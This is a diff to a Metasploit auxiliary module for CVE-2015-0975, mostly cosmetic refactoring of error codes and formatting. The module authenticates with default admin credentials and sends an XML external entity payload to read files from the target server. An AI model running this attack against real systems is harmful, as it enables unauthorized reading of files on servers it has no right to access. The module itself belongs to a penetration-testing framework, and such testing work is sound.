@@ -1,7 +1,7 @@
 require 'msf/core'
 require 'openssl'
 
-class Metasploit3 < Msf::Auxiliary
+class Metasploit4 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
@@ -23,13 +23,11 @@ class Metasploit3 < Msf::Auxiliary
       admin password of "admin" for security purposes.
       },
       'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+      'Author'         => [
           'Stephen Breen <breenmachine[at]gmail.com>', # discovery
           'Justin Kennedy <jstnkndy[at]gmail.com>', # metasploit module
         ],
-      'References'     =>
-        [
+      'References'     => [
           ['CVE', '2015-0975']
         ],
       'DisclosureDate' => 'Jan 08 2015'
@@ -62,20 +60,20 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res.nil?
-      fail_with("No response from POST request")
+      fail_with(Failure::Unreachable, "No response from POST request")
     elsif res.code != 302
-      fail_with("Non-302 response from POST request")
+      fail_with(Failure::UnexpectedReply, "Non-302 response from POST request")
     end
 
     unless res.headers["Location"].include? "index.jsp"
-      fail_with(Failure::Unknown, 'Authentication failed')
+      fail_with(Failure::NoAccess, 'Authentication failed')
     end
 
     cookie = res.get_cookies
 
     print_status("Got cookie, going for the goods")
 
-    rand_doctype= Rex::Text.rand_text_alpha(rand(1..10))
+    rand_doctype = Rex::Text.rand_text_alpha(rand(1..10))
     rand_entity1 = Rex::Text.rand_text_alpha(rand(1..10))
     rand_entity2 = Rex::Text.rand_text_alpha(rand(1..10))
     delimiter = SecureRandom.uuid
@@ -88,14 +86,13 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_raw({
       'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'rtc', 'post/'),
-      'data' => xxe,
+      'uri'    => normalize_uri(target_uri.path, 'rtc', 'post/'),
+      'data'   => xxe,
       'cookie' => cookie
     })
 
     # extract filepath data from response
-
-    if res and res.code == 400 and res.message =~ /#{delimiter}(.+)#{delimiter}/
+    if res && res.code == 400 && res.body =~ /title.+#{delimiter}(.+)#{delimiter}.+title/m
       result = $1
       print_good("#{result}")
     else
